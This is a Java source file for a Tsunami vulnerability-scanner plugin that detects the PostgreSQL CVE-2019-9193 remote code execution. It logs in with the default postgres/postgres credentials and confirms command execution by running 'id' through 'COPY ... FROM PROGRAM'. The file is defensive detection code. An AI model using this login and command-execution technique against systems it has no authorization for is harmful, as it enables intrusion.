/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20199193;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForServiceName;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.security.SecureRandom;
import java.sql.Connection;
import java.sql.SQLException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin for detecting CVE-2019-9193. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve20199193Detector",
    version = "0.1",
    description =
        "This plugin for Tsunami detects a postgres remote code execution (RCE) caused by default"
            + " credentials and 'COPY..PROGRAM'.",
    author = "Victor (vicp@google.com)",
    bootstrapModule = Cve20199193DetectorBootstrapModule.class)
@ForServiceName(value = {"postgresql"})
public final class Cve20199193Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final ConnectionProviderInterface connectionProvider;

  private static final String USER = "postgres";
  private static final String PASSWORD = "postgres";

  @VisibleForTesting
  static final String DESCRIPTION =
      "This plugin for Tsunami detects a postgres remote code execution (RCE) caused by default"
          + " credentials and 'COPY..PROGRAM'.";

  @VisibleForTesting static final String RECOMMENDATION = "Change the default login credentials.";

  @VisibleForTesting
  static final Vulnerability VULNERABILITY =
      Vulnerability.newBuilder()
          .setMainId(VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2019_9193"))
          .setSeverity(Severity.CRITICAL)
          .setTitle("PostgreSQL RCE CVE-2019-9193 Detected")
          .setDescription(DESCRIPTION)
          .setRecommendation(RECOMMENDATION)
          .build();

  @Inject
  Cve20199193Detector(@UtcClock Clock utcClock, ConnectionProviderInterface connectionProvider) {
    this.utcClock = checkNotNull(utcClock);
    this.connectionProvider = checkNotNull(connectionProvider);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve20199193Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var endpoint = networkService.getNetworkEndpoint();
    String host;
    if (endpoint.hasHostname()) {
      host = endpoint.getHostname().getName();
    } else if (endpoint.hasIpAddress()) {
      host = endpoint.getIpAddress().getAddress();
    } else {
      logger.atSevere().log("Need IP or hostname!");
      return false;
    }

    int port;
    if (endpoint.hasPort()) {
      port = endpoint.getPort().getPortNumber();
    } else {
      logger.atWarning().log("No port given, using default port (5432)");
      port = 5432;
    }

    boolean result = false;
    try {
      var url = String.format("jdbc:postgresql://%s:%d/postgres", host, port);
      logger.atInfo().log("url: %s", url);
      Connection conn = connectionProvider.getConnection(url, USER, PASSWORD);

      if (conn != null) {
        logger.atInfo().log("Connected to the PostgreSQL server successfully.");
      } else {
        logger.atSevere().log("Failed to make connection!");
        return false;
      }

      var stmt = conn.createStatement();
      var table = randomTableName();
      stmt.executeUpdate("CREATE TABLE " + table + "(cmd_output text)");
      // send payload
      stmt.executeUpdate("COPY " + table + " FROM PROGRAM 'id'");
      // get response
      var results = stmt.executeQuery("SELECT * FROM " + table);
      if (results.next() && results.getString(1).startsWith("uid=")) {
        logger.atInfo().log("Cve20199193Detector got: %s", results.getString(1));
        result = true;
      }

      // cleanup
      stmt.executeUpdate("DROP TABLE IF EXISTS " + table);
      stmt.close();
    } catch (SQLException e) {
      logger.atSevere().log(
          "Cve20199193Detector sql error: %s (%d)", e.getMessage(), e.getErrorCode());
    }

    return result;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(VULNERABILITY)
        .build();
  }

  private String randomTableName() {
    long nonce = new SecureRandom().nextInt(Integer.MAX_VALUE);
    return "tsunami_cmd_exec_" + nonce;
  }
}
